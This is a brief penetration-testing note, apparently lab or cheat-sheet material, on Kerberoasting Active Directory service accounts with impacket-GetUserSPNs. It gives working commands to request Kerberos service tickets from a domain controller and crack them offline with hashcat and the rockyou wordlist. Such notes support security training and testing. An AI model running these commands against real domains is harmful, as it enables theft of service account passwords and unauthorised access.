Using impacket-GetUserSPNs

impacket-GetUserSPNs performs Kerberoasting by enumerating Service Principal Names (SPNs) and requesting Kerberos service tickets (TGS) for associated service accounts. The returned tickets can then be cracked offline to recover service account passwords.

Advantages

Supports offline password cracking, generates minimal network traffic, and works from Linux.

Disadvantages

Requires a valid domain account, and TGS requests can still be logged and detected by security monitoring solutions.

Perform Kerberoasting

sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete

Crack Hash Use Hashcat

sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
